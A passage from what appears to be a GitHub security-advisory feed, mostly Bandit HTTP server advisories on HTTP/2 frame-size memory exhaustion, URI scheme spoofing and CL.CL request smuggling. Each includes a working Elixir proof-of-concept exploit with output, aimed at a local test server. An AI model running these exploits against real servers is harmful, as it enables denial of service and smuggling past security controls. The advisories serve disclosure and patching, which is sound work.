<li><code>0.15.1</code> (for the 0.15.x line)</li>
<li><code>0.16.1</code> (for the 0.16.x line)</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>None. Upgrade is required.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/issues/249">Issue</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/pull/250">PR</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.15.1">Release 0.15.1</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.16.1">Release 0.16.1</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/security/advisories/GHSA-qwfw-ggxw-577c">https://github.com/elixir-webrtc/ex_webrtc/security/advisories/GHSA-qwfw-ggxw-577c</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/issues/249">https://github.com/elixir-webrtc/ex_webrtc/issues/249</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/pull/250">https://github.com/elixir-webrtc/ex_webrtc/pull/250</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/commit/658c63221a869fb12bb9989599c3688751b0531b">https://github.com/elixir-webrtc/ex_webrtc/commit/658c63221a869fb12bb9989599c3688751b0531b</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.15.1">https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.15.1</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.16.1">https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.16.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44700">https://nvd.nist.gov/vuln/detail/CVE-2026-44700</a></li>
<li><a href="https://github.com/advisories/GHSA-qwfw-ggxw-577c">https://github.com/advisories/GHSA-qwfw-ggxw-577c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qwfw-ggxw-577c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-08T17:08:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bandit] Bandit HTTP/2 Frame Size Limit Bypass via Late Buffer Check Enables Memory Exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-q6v9-r226-v65f</id>
        <link href="https://github.com/advisories/GHSA-q6v9-r226-v65f"/>
        <updated>2026-05-07T03:52:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Bandit's HTTP/2 parser checks frame size <em>after</em> it has already buffered the full body, instead of when it sees the 9-byte header. A peer can announce a 16 MiB frame on a connection that agreed to 16 KiB frames and the server will silently buffer up to 1024× the agreed budget per connection. Across many connections this becomes a memory-pressure DoS. Severity: medium.</p>
<h3 id="details">Details</h3>
<p>In <code>lib/bandit/http2/frame.ex:23-65</code>, every clause that could detect an oversized frame requires <code>payload::binary-size(length)</code> to match — meaning the body has to be fully in memory before the size guard runs. Until then the parser returns <code>{:more, msg}</code> and the connection layer keeps reading. So the cap fires only after the violation is complete.</p>
<p>The frame type and stream id don't matter; the parser never gets that far.</p>
<h3 id="poc">PoC</h3>
<p>The script is at the end. It:</p>
<ol>
<li>Opens an h2c connection to a Bandit server it starts itself.</li>
<li>Sends a 9-byte frame header announcing <code>length = 0xFFFFFF</code> (~16 MiB).</li>
<li>Polls for <code>GOAWAY(FRAME_SIZE_ERROR)</code>. If silent, drips body bytes in 64 KiB chunks.</li>
</ol>
<p>A patched server sends GOAWAY on the header alone. A vulnerable server stays silent and keeps accepting bytes.</p>
<p><strong>Suggested fix</strong></p>
<p>Add a header-only clause that rejects on the length field alone, e.g. <code>def deserialize(&lt;&lt;length::24, _::binary&gt;&gt; = msg, max_frame_size) when length &gt; max_frame_size, do: {{:error, frame_size_error(), "..."}, drop_frame_or_close(msg)}</code>, placed before the body-bearing clauses so the size check runs as soon as the 9-byte header is in hand rather than after the body has been buffered.</p>
<h3 id="impact">Impact</h3>
<p>Any Bandit server speaking HTTP/2 (h2 or h2c). No authentication or specific route needed — the bug is in the framing layer, before any Plug runs. An attacker holding a few thousand concurrent connections can pin tens of GiB of buffer memory, far beyond what the negotiated <code>max_frame_size</code> should allow. No code execution, no data disclosure — pure resource exhaustion.</p>
<p>Fix: add a header-only clause that rejects on <code>length &gt; max_frame_size</code> as soon as the 9 header bytes arrive, before the body-bearing clauses.</p>
<pre><code class="language-elixir"># Bandit HTTP/2 oversized-frame late-check PoC.
#
# RFC 9113 §6.5.2 sets the default SETTINGS_MAX_FRAME_SIZE to 16384.
# Bandit's frame deserializer (lib/bandit/http2/frame.ex) checks this
# limit *after* matching `payload::binary-size(length)` in the frame
# pattern. When the announced length exceeds what the buffer holds,
# none of the body-bearing clauses match and `deserialize/2` returns
# `{:more, msg}`, telling the caller to keep buffering. The oversize
# error in the "valid shape, length &gt; max_frame_size" clause therefore
# fires only *after* the entire announced body has been received —
# letting a peer trickle up to ~16 MiB per frame (the 24-bit length
# field maximum) into the server before the cap engages, well past
# the 16 KiB the server agreed to.
#
# This PoC announces a frame with length = 0xFFFFFF (~16 MiB), drips
# body bytes in 64 KiB chunks, and after each chunk does a brief
# non-blocking recv to see if the server has reacted. A patched server
# should send GOAWAY(FRAME_SIZE_ERROR) within the first chunk (header
# alone is enough). A vulnerable server keeps silently accepting up
# to the full 16 MiB.
#
# We use a SETTINGS frame (type=0x4, stream_id=0) for the abusive
# header — the parser never reaches dispatch (it's stuck buffering
# body), so the type and stream id are immaterial to the bug.
#
# Run: elixir scripts/bandit/http2_frame_size_late_check.exs

Mix.install([
  {:bandit, "~&gt; 1.10"},
  {:plug, "~&gt; 1.19"}
])

defmodule NoopApp do
  @behaviour Plug
  def init(opts), do: opts
  def call(conn, _opts), do: Plug.Conn.send_resp(conn, 200, "ok\n")
end

defmodule FrameSizeLateCheck do
  @port 4321
  @connection_preface "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

  @type_settings 0x4
  @type_goaway 0x7
  @flag_settings_ack 0x1

  @max_24_bit 0xFFFFFF
  @drip_chunk_size 64 * 1024
  @max_total_drip 4 * 1024 * 1024

  def run do
    {:ok, _} = Bandit.start_link(plug: NoopApp, ip: {127, 0, 0, 1}, port: @port)

    {:ok, sock} =
      :gen_tcp.connect(~c"127.0.0.1", @port, [:binary, active: false, nodelay: true])

    advertised_max_frame_size = handshake!(sock)
    log("Handshake complete. Server advertised max_frame_size=#{advertised_max_frame_size}.")

    abusive_header =
      frame_header(@max_24_bit, @type_settings, 0, 0)

    log(
      "Sending oversized SETTINGS header: length=#{@max_24_bit} " &lt;&gt;
        "(#{div(@max_24_bit, 1024 * 1024)} MiB) vs cap #{advertised_max_frame_size}."
    )

    :ok = :gen_tcp.send(sock, abusive_header)

    case poll_for_reaction(sock, 200) do
      {:goaway, error_code} -&gt;
        log("Server sent GOAWAY on header alone: error_code=#{error_code} — patched.")
        finish(sock)

      :silent -&gt;
        log("Server silent after header. Beginning body drip…")
        drip_loop(sock, 0)
    end
  end

  defp drip_loop(sock, total_sent) when total_sent &gt;= @max_total_drip do
    log(
      "Drip cap reached: #{total_sent} bytes accepted with no server reaction. " &lt;&gt;
        "Server is buffering an oversized frame body well past max_frame_size."
    )

    finish(sock)
  end

  defp drip_loop(sock, total_sent) do
    chunk = :binary.copy(&lt;&lt;0&gt;&gt;, @drip_chunk_size)

    case :gen_tcp.send(sock, chunk) do
      :ok -&gt;
        new_total = total_sent + @drip_chunk_size

        case poll_for_reaction(sock, 50) do
          {:goaway, error_code} -&gt;
            log(
              "After #{new_total} body bytes (#{div(new_total, 1024)} KiB) the server " &lt;&gt;
                "sent GOAWAY: error_code=#{error_code}."
            )

            finish(sock)

          :silent -&gt;
            if rem(new_total, 512 * 1024) == 0 do
              log("Dripped #{div(new_total, 1024)} KiB so far, no reaction.")
            end

            drip_loop(sock, new_total)
        end

      {:error, reason} -&gt;
        log("Send failed at total=#{total_sent}: #{inspect(reason)}.")
        finish(sock)
    end
  end

  defp poll_for_reaction(sock, timeout_ms) do
    case :gen_tcp.recv(sock, 9, timeout_ms) do
      {:ok, &lt;&lt;length::24, type::8, _flags::8, _r::1, _stream_id::31&gt;&gt;} -&gt;
        case recv_payload(sock, length, timeout_ms) do
          {:ok, payload} when type == @type_goaway -&gt;
            &lt;&lt;_last_id::32, error_code::32, _debug::binary&gt;&gt; = payload
            {:goaway, error_code}

          {:ok, _} -&gt;
            :silent

          {:error, _} -&gt;
            :silent
        end

      {:error, :timeout} -&gt;
        :silent

      {:error, :closed} -&gt;
        {:goaway, :connection_closed_without_goaway}
    end
  end

  defp finish(sock), do: :gen_tcp.close(sock)

  # --- HTTP/2 handshake helpers ------------------------------------------

  defp handshake!(sock) do
    :ok = :gen_tcp.send(sock, @connection_preface)
    :ok = :gen_tcp.send(sock, build_settings_frame(&lt;&lt;&gt;&gt;))

    {:ok, server_settings_frame} = recv_full_frame(sock, 5_000)
    @type_settings = server_settings_frame.type
    advertised_max_frame_size = parse_max_frame_size(server_settings_frame.payload)

    :ok = :gen_tcp.send(sock, build_settings_frame(&lt;&lt;&gt;&gt;, @flag_settings_ack))

    _ = drain(sock, 100)
    advertised_max_frame_size
  end

  # SETTINGS payload is a sequence of 6-byte (id::16, value::32) entries.
  # SETTINGS_MAX_FRAME_SIZE has id=0x5; default per RFC 9113 is 16384.
  defp parse_max_frame_size(payload), do: parse_max_frame_size(payload, 16384)
  defp parse_max_frame_size(&lt;&lt;&gt;&gt;, current_value), do: current_value

  defp parse_max_frame_size(&lt;&lt;0x5::16, value::32, rest::binary&gt;&gt;, _current) do
    parse_max_frame_size(rest, value)
  end

  defp parse_max_frame_size(&lt;&lt;_id::16, _value::32, rest::binary&gt;&gt;, current) do
    parse_max_frame_size(rest, current)
  end

  defp build_settings_frame(payload, flags \\ 0) do
    frame_header(byte_size(payload), @type_settings, flags, 0) &lt;&gt; payload
  end

  defp frame_header(length, type, flags, stream_id) do
    &lt;&lt;length::24, type::8, flags::8, 0::1, stream_id::31&gt;&gt;
  end

  defp recv_full_frame(sock, timeout_ms) do
    with {:ok, &lt;&lt;length::24, type::8, flags::8, _r::1, stream_id::31&gt;&gt;} &lt;-
           :gen_tcp.recv(sock, 9, timeout_ms),
         {:ok, payload} &lt;- recv_payload(sock, length, timeout_ms) do
      {:ok, %{length: length, type: type, flags: flags, stream_id: stream_id, payload: payload}}
    end
  end

  defp recv_payload(_sock, 0, _timeout_ms), do: {:ok, &lt;&lt;&gt;&gt;}
  defp recv_payload(sock, length, timeout_ms), do: :gen_tcp.recv(sock, length, timeout_ms)

  defp drain(sock, timeout_ms) do
    case :gen_tcp.recv(sock, 0, timeout_ms) do
      {:ok, bytes} -&gt; bytes &lt;&gt; drain(sock, timeout_ms)
      {:error, _} -&gt; &lt;&lt;&gt;&gt;
    end
  end

  defp log(message), do: IO.puts("[#{Time.utc_now() |&gt; Time.truncate(:millisecond)}] #{message}")
end

FrameSizeLateCheck.run()
</code></pre>
<pre><code class="language-logs">17:23:19.125 [info] Running NoopApp with Bandit 1.10.4 at 127.0.0.1:4321 (http)
[15:23:19.242] Handshake complete. Server advertised max_frame_size=16384.
[15:23:19.243] Sending oversized SETTINGS header: length=16777215 (15 MiB) vs cap 16384.
[15:23:19.444] Server silent after header. Beginning body drip…
[15:23:19.857] Dripped 512 KiB so far, no reaction.
[15:23:20.265] Dripped 1024 KiB so far, no reaction.
[15:23:20.676] Dripped 1536 KiB so far, no reaction.
[15:23:21.094] Dripped 2048 KiB so far, no reaction.
[15:23:21.511] Dripped 2560 KiB so far, no reaction.
[15:23:21.925] Dripped 3072 KiB so far, no reaction.
[15:23:22.340] Dripped 3584 KiB so far, no reaction.
[15:23:22.749] Dripped 4096 KiB so far, no reaction.
[15:23:22.749] Drip cap reached: 4194304 bytes accepted with no server reaction. Server is buffering an oversized frame body well past max_frame_size.
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mtrudel/bandit/security/advisories/GHSA-q6v9-r226-v65f">https://github.com/mtrudel/bandit/security/advisories/GHSA-q6v9-r226-v65f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42788">https://nvd.nist.gov/vuln/detail/CVE-2026-42788</a></li>
<li><a href="https://github.com/mtrudel/bandit/commit/1e8e55966da9129016b73d32f0e1df4630e3b463">https://github.com/mtrudel/bandit/commit/1e8e55966da9129016b73d32f0e1df4630e3b463</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-42788.html">https://cna.erlef.org/cves/CVE-2026-42788.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-42788">https://osv.dev/vulnerability/EEF-CVE-2026-42788</a></li>
<li><a href="https://github.com/advisories/GHSA-q6v9-r226-v65f">https://github.com/advisories/GHSA-q6v9-r226-v65f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q6v9-r226-v65f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T03:52:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bandit] Bandit trusts client-supplied URI scheme on plaintext connections]]></title>
        <id>https://github.com/advisories/GHSA-375f-4r2h-f99j</id>
        <link href="https://github.com/advisories/GHSA-375f-4r2h-f99j"/>
        <updated>2026-05-07T03:47:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Bandit reflects the client-supplied URI scheme into <code>conn.scheme</code> without verifying the actual transport. Over a plaintext HTTP/1.1 connection (or h2c), an unauthenticated attacker can send an absolute-form request target like <code>GET https://victim/path HTTP/1.1</code> and the application observes <code>conn.scheme = :https</code> even though no TLS was negotiated. Any downstream Plug logic that trusts <code>conn.scheme</code> as a security signal — <code>Plug.SSL</code>'s "already secure, don't redirect" branch, <code>secure: true</code> cookie flagging, audit logging, CSRF/SameSite gating — is silently misled into treating an attacker's plaintext connection as encrypted.</p>
<p>The vulnerability was introduced on Jun 8, 2023: <a href="https://github.com/mtrudel/bandit/commit/ff2f829326cd5dcf7335939aef9775269d881e28">https://github.com/mtrudel/bandit/commit/ff2f829326cd5dcf7335939aef9775269d881e28</a></p>
<h3 id="details">Details</h3>
<p>The bug is in <code>lib/bandit/pipeline.ex</code> at <code>determine_scheme/2</code> (around line 89). The function takes the request target's scheme and the transport's <code>secure?</code> flag and produces the URI scheme used to build the <code>%Plug.Conn{}</code>. The third match clause is <code>{_, scheme} -&gt; scheme</code> — i.e. whenever the client supplies <em>any</em> scheme on the request target, the function returns that scheme verbatim and discards <code>secure?</code> entirely.</p>
<p>Two attacker-controlled inputs reach this code path:</p>
<ul>
<li>HTTP/1.1 absolute-form request targets (RFC 9112 §3.2.2), e.g. <code>GET https://victim/path HTTP/1.1</code>.</li>
<li>HTTP/2 <code>:scheme</code> pseudo-header, which is a free-form string sent by the client.</li>
</ul>
<p>Neither value is constrained to match the actual transport. On a plaintext TCP listener (or h2c), a client can declare <code>https</code> and Bandit will pass <code>%URI{scheme: "https"}</code> into <code>Plug.Conn.Adapter.conn/5</code>, producing <code>conn.scheme == :https</code>. There is no guard in <code>determine_scheme/2</code>; the discarding of <code>secure?</code> is deliberate.</p>
<p><strong>Suggested fix:</strong> when <code>secure?</code> is <code>true</code>, force the scheme to <code>"https"</code>; when <code>false</code>, force it to <code>"http"</code> — or reject the request with <code>400 Bad Request</code> if the supplied scheme disagrees with the transport's actual security state. Do not trust the client-supplied scheme.</p>
<h3 id="poc">PoC</h3>
<p>A self-contained reproduction script is available below. It starts plaintext Bandit 1.10 on <code>127.0.0.1:4321</code> with a Plug that echoes <code>conn.scheme</code>, opens a plain TCP socket, and sends:</p>
<pre><code>GET https://127.0.0.1:4321/ HTTP/1.1
Host: 127.0.0.1:4321
Connection: close
</code></pre>
<p>A correctly-behaving server would either coerce <code>conn.scheme</code> to <code>:http</code> or return <code>400 Bad Request</code>. Bandit 1.10.4 returns <code>:https</code>, confirming the spoof.</p>
<h3 id="impact">Impact</h3>
<p>Transport-state spoofing. Any unauthenticated client speaking plaintext HTTP/1.1 or h2c to a Bandit endpoint can cause the application to treat the connection as if it had been TLS-protected. Concrete consequences in real Phoenix/Plug stacks include:</p>
<ul>
<li><code>Plug.SSL</code> skipping its HTTP→HTTPS redirect because the request "already looks secure", letting plaintext requests bypass the redirect entirely.</li>
<li>Cookies emitted with <code>secure: true</code> on a plaintext response, where a network attacker could capture them.</li>
<li>Audit logs recording requests as having arrived over HTTPS when they did not, breaking forensic and compliance assumptions.</li>
<li>Application code that uses <code>conn.scheme</code> to gate CSRF/SameSite policy, OAuth redirect URIs, or HSTS-related decisions making the wrong call.</li>
</ul>
<p>The vulnerability is unauthenticated and trivially automatable; severity is medium because exploitation requires the deployment to expose a plaintext Bandit listener (or h2c) and to have downstream code that branches on <code>conn.scheme</code>.</p>
<h3 id="script-and-logs">Script and Logs</h3>
<pre><code class="language-elixir"># Bandit reflects the client-supplied scheme into conn.scheme.
#
# lib/bandit/pipeline.ex:89 (determine_scheme/2) returns whatever scheme
# appears on the request target, ignoring the `secure?` flag that records
# the actual transport state. HTTP/1.1 absolute-form request targets
# (e.g. `GET https://victim/path HTTP/1.1`) and HTTP/2 `:scheme` are both
# attacker-controlled strings that flow into this function. Over a
# plaintext connection, a client can claim `https` and Bandit hands a
# `%Plug.Conn{scheme: :https}` to the application — even though no TLS
# was negotiated.
#
# Downstream Plug consumers that branch on `conn.scheme` are misled:
# Plug.SSL's "already secure, don't redirect" path, `secure: true` cookie
# flagging, audit logs, CSRF/SameSite gating, etc.
#
# This script starts plaintext Bandit 1.10 on 127.0.0.1:4321, sends one
# HTTP/1.1 absolute-form request with scheme `https://`, and prints the
# `conn.scheme` the application observes. A fixed server should report
# `:http` (or reject the request); the buggy server reports `:https`.
#
# Run: elixir scripts/bandit/http1_scheme_spoofing.exs

Mix.install([
  {:bandit, "~&gt; 1.10"},
  {:plug, "~&gt; 1.19"}
])

defmodule SchemeApp do
  @behaviour Plug
  def init(opts), do: opts

  def call(conn, _opts) do
    body = "This is what the Plug sees: conn.scheme=#{inspect(conn.scheme)}\n"
    Plug.Conn.send_resp(conn, 200, body)
  end
end

defmodule SchemeSpoof do
  @port 4321

  def run do
    {:ok, _} = Bandit.start_link(plug: SchemeApp, ip: {127, 0, 0, 1}, port: @port)

    {:ok, sock} = :gen_tcp.connect(~c"127.0.0.1", @port, [:binary, active: false])

    # Absolute-form request target with scheme "https" over a plaintext
    # TCP connection. RFC 9112 §3.2.2 allows absolute-form on any request;
    # nothing about it implies the connection is TLS.
    request =
      "GET https://127.0.0.1:#{@port}/ HTTP/1.1\r\n" &lt;&gt;
        "Host: 127.0.0.1:#{@port}\r\n" &lt;&gt;
        "Connection: close\r\n" &lt;&gt;
        "\r\n"

    log("Sending plaintext HTTP/1.1 request with absolute-form target `https://…/`.")
    :ok = :gen_tcp.send(sock, request)

    {:ok, response} = :gen_tcp.recv(sock, 0, 5_000)
    :gen_tcp.close(sock)

    log("Server response:")
    IO.puts(response)

    cond do
      response =~ "conn.scheme=:https" -&gt;
        log("VULNERABLE — application sees conn.scheme = :https on a plaintext socket.")
        log("Plug.SSL's `already-secure` branch, `secure: true` cookies, etc. would all trust this.")

      response =~ "conn.scheme=:http" -&gt;
        log("Server forced scheme to :http — bug appears patched.")

      true -&gt;
        log("Unexpected response shape.")
    end
  end

  defp log(message), do: IO.puts("[#{Time.utc_now() |&gt; Time.truncate(:millisecond)}] #{message}")
end

SchemeSpoof.run()
</code></pre>
<pre><code class="language-logs">12:53:25.297 [info] Running SchemeApp with Bandit 1.10.4 at 127.0.0.1:4321 (http)
[10:53:25.305] Sending plaintext HTTP/1.1 request with absolute-form target `https://…/`.
[10:53:25.316] Server response:
HTTP/1.1 200 OK
date: Tue, 28 Apr 2026 10:53:25 GMT
content-length: 47
vary: accept-encoding
cache-control: max-age=0, private, must-revalidate

This is what the Plug sees: conn.scheme=:https

[10:53:25.316] VULNERABLE — application sees conn.scheme = :https on a plaintext socket.
[10:53:25.316] Plug.SSL's `already-secure` branch, `secure: true` cookies, etc. would all trust this.
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mtrudel/bandit/security/advisories/GHSA-375f-4r2h-f99j">https://github.com/mtrudel/bandit/security/advisories/GHSA-375f-4r2h-f99j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39807">https://nvd.nist.gov/vuln/detail/CVE-2026-39807</a></li>
<li><a href="https://github.com/mtrudel/bandit/commit/45feea20dea8af7ffd7245271107b695c040e667">https://github.com/mtrudel/bandit/commit/45feea20dea8af7ffd7245271107b695c040e667</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-39807.html">https://cna.erlef.org/cves/CVE-2026-39807.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-39807">https://osv.dev/vulnerability/EEF-CVE-2026-39807</a></li>
<li><a href="https://github.com/advisories/GHSA-375f-4r2h-f99j">https://github.com/advisories/GHSA-375f-4r2h-f99j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-375f-4r2h-f99j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T03:47:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bandit] Bandit is vulnerable to CL.CL request smuggling via unrejected duplicate `Content-Length` header]]></title>
        <id>https://github.com/advisories/GHSA-c67r-gc9j-2qf7</id>
        <link href="https://github.com/advisories/GHSA-c67r-gc9j-2qf7"/>
        <updated>2026-05-07T03:46:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Bandit is vulnerable to CL.CL HTTP request smuggling: it silently accepts requests with two <code>Content-Length</code> headers whose values differ, takes the first value, and dispatches the body bytes as a second pipelined request on the same keep-alive connection. RFC 9110 §5.3 prohibits multiple lines for singleton fields like <code>Content-Length</code>, and RFC 9112 §6.3 item 5 requires the recipient to treat invalid <code>Content-Length</code> as an unrecoverable framing error. When Bandit sits behind a proxy that picks the <em>last</em> <code>Content-Length</code> and forwards rather than rejects, an unauthenticated attacker can smuggle requests past edge WAF rules, path-based ACLs, rate limiting, and audit logging.</p>
<p>The vulnerability was introduced prior to <code>v0.1.0 (released Nov 5, 2020)</code> on Nov 16, 2019: <a href="https://github.com/mtrudel/bandit/commit/e5270b1b19e9f3574aa0f87ec76851d66c38c0af">https://github.com/mtrudel/bandit/commit/e5270b1b19e9f3574aa0f87ec76851d66c38c0af</a></p>
<h3 id="details">Details</h3>
<p><code>Bandit.Headers.get_content_length/1</code> (<code>lib/bandit/headers.ex</code>) calls <code>List.keyfind/3</code>, which returns only the first matching header. Bandit already correctly rejects the comma-separated form (<code>Content-Length: 0, 43</code>) when values differ; the bug is that the multi-line form never reaches that check.</p>
<p><strong>Fix:</strong> collect every <code>Content-Length</code> value from the header list and reject unless all values parse and are byte-identical — extending the existing rejection to the multi-line case.</p>
<h3 id="poc">PoC</h3>
<p>The script below boots a local Bandit server with a Plug that echoes the dispatched method and path, then sends a POST with <code>Content-Length: 0</code> followed by <code>Content-Length: 43</code> and a 43-byte body containing a valid <code>GET /smuggled HTTP/1.1</code> request line. Run with <code>elixir script.exs</code></p>
<p>On Bandit 1.10.4 / Elixir 1.18, default config: two <code>200 OK</code> responses on the same TCP connection. First body <code>method=POST path=/</code>, second body <code>method=GET path=/smuggled</code>. Bandit accepted the malformed request and dispatched the embedded request line as a second request.</p>
<h3 id="impact">Impact</h3>
<p>Spec violation that becomes request smuggling when paired with a permissive frontend. Practical impact depends entirely on what sits between the internet and Bandit, not on what runs above it.</p>
<p>The application framework (Phoenix, LiveView, Phoenix-API + React SPA) is irrelevant — smuggled requests still flow through the full Plug pipeline, so application auth still runs. The attacker is someone hitting the API directly with curl, not the SPA.</p>
<p>Real exposure concentrates at boundary controls the proxy enforces and Bandit doesn't see: edge WAF, path-based ACLs at the LB, edge rate limiting, centralized audit logging, and — the only realistic data-exfil path — response-queue desync on pooled upstream connections.</p>
<p>Most major frontends already reject CL.CL (Cloudflare, AWS ALB, current nginx, HAProxy in default strict mode). Realistic exposure: custom proxies, older nginx, in-house API gateways, or multi-hop setups where one hop is permissive.</p>
<ul>
<li>Bandit directly on the internet: spec violation, no exploit.</li>
<li>Bandit behind a major CDN/LB: almost certainly safe.</li>
<li>Bandit behind a custom or unverified proxy: real smuggling exposure, bounded by what that proxy was enforcing.</li>
</ul>
<p>Worth fixing regardless — the current behavior silently shifts security responsibility onto whichever proxy is deployed.</p>
<h3 id="script-and-logs">Script and Logs</h3>
<pre><code class="language-elixir"># Bandit HTTP/1 duplicate Content-Length first-wins PoC.
#
# Bandit.Headers.get_content_length/1 calls List.keyfind/3, which returns the
# first Content-Length value and silently ignores additional Content-Length
# entries. RFC 9112 §6.3 explicitly classifies this as an unrecoverable error
# and says the recipient MUST treat it as such.
#
# This is the classic CL.CL request-smuggling primitive. If a fronting proxy
# uses the *last* Content-Length while Bandit uses the first (or vice versa),
# the second "request" embedded in the first request's body gets dispatched
# as a new request on the same keep-alive connection - after the proxy has
# already applied its access controls.
#
# Run: elixir scripts/bandit/http1_duplicate_content_length.exs

Mix.install([
  {:bandit, "~&gt; 1.10"},
  {:plug, "~&gt; 1.19"}
])

defmodule DemoApp do
  @behaviour Plug

  import Plug.Conn

  def init(opts), do: opts

  def call(conn, _opts) do
    send_resp(conn, 200, "method=#{conn.method} path=#{conn.request_path}\n")
  end
end

defmodule Smuggle do
  @port 4321

  def run do
    {:ok, _} = Bandit.start_link(plug: DemoApp, ip: {127, 0, 0, 1}, port: @port)

    request = build_smuggling_request()
    log("Sending #{byte_size(request)}-byte CL.CL request:\n#{request}")

    {:ok, sock} = :gen_tcp.connect(~c"127.0.0.1", @port, [:binary, active: false])
    :ok = :gen_tcp.send(sock, request)

    response = read_all(sock)
    :gen_tcp.close(sock)

    log("Response stream:\n#{response}")
    diagnose(response)
  end

  # POST with two Content-Length headers, plus a smuggled GET line in the
  # body. A CL-last frontend would forward the body bytes; Bandit (CL-first)
  # reads 0 bytes per Content-Length: 0, replies, and the smuggled request
  # line either gets parsed as a new request on the keep-alive connection
  # or stays in the buffer.
  defp build_smuggling_request do
    smuggled_request = "GET /smuggled HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"
    smuggled_size = byte_size(smuggled_request)

    "POST / HTTP/1.1\r\n" &lt;&gt;
      "Host: 127.0.0.1\r\n" &lt;&gt;
      "Content-Length: 0\r\n" &lt;&gt;
      "Content-Length: #{smuggled_size}\r\n" &lt;&gt;
      "\r\n" &lt;&gt;
      smuggled_request
  end

  defp read_all(sock, accumulated \\ "") do
    case :gen_tcp.recv(sock, 0, 2_000) do
      {:ok, bytes} -&gt; read_all(sock, accumulated &lt;&gt; bytes)
      {:error, _reason} -&gt; accumulated
    end
  end

  # Three observable outcomes:
  #   - 400 Bad Request -&gt; RFC-conformant rejection (not what current
  #     Bandit does).
  #   - Two responses, second one for /smuggled -&gt; Bandit dispatched the
  #     smuggled request as a second pipelined request.
  #   - One response -&gt; Bandit accepted Content-Length: 0, the smuggled
  #     bytes sat in the keep-alive buffer; with a CL-last frontend this
  #     becomes a smuggled request on the next request boundary.
  defp diagnose(response) do
    response_lines = Regex.scan(~r/^HTTP\/1\.[01] \d{3}[^\r\n]*/m, response) |&gt; List.flatten()
    log("HTTP/1.x response lines observed: #{length(response_lines)}")
    Enum.each(response_lines, fn line -&gt; log("  #{line}") end)

    cond do
      response =~ ~r/^HTTP\/1\.[01] 400/ -&gt;
        log("OK: Bandit rejected duplicate Content-Length (RFC 9112 §6.3 conformant).")

      response =~ "/smuggled" -&gt;
        log("VULNERABLE: smuggled GET /smuggled was processed as a second request.")

      length(response_lines) == 1 -&gt;
        log("ACCEPTED: Bandit took the first Content-Length (0) and left the")
        log("smuggled request line in the keep-alive buffer. Combined with a")
        log("CL-last frontend this becomes request smuggling.")

      true -&gt;
        log("Inconclusive - see raw response above.")
    end
  end

  defp log(message), do: IO.puts("[#{Time.utc_now() |&gt; Time.truncate(:millisecond)}] #{message}")
end

Smuggle.run()
</code></pre>
<pre><code class="language-logs">11:52:23.036 [info] Running DemoApp with Bandit 1.10.4 at 127.0.0.1:4321 (http)
[09:52:23.039] Sending 118-byte CL.CL request:
POST / HTTP/1.1
Host: 127.0.0.1
Content-Length: 0
Content-Length: 43

GET /smuggled HTTP/1.1
Host: 127.0.0.1


[09:52:25.057] Response stream:
HTTP/1.1 200 OK
date: Tue, 28 Apr 2026 09:52:22 GMT
content-length: 19
vary: accept-encoding
cache-control: max-age=0, private, must-revalidate

method=POST path=/
HTTP/1.1 200 OK
date: Tue, 28 Apr 2026 09:52:22 GMT
content-length: 26
vary: accept-encoding
cache-control: max-age=0, private, must-revalidate

method=GET path=/smuggled

[09:52:25.057] HTTP/1.x response lines observed: 2
[09:52:25.057]   HTTP/1.1 200 OK
[09:52:25.057]   HTTP/1.1 200 OK
[09:52:25.058] VULNERABLE: smuggled GET /smuggled was processed as a second request.
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mtrudel/bandit/security/advisories/GHSA-c67r-gc9j-2qf7">https://github.com/mtrudel/bandit/security/advisories/GHSA-c67r-gc9j-2qf7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39805">https://nvd.nist.gov/vuln/detail/CVE-2026-39805</a></li>
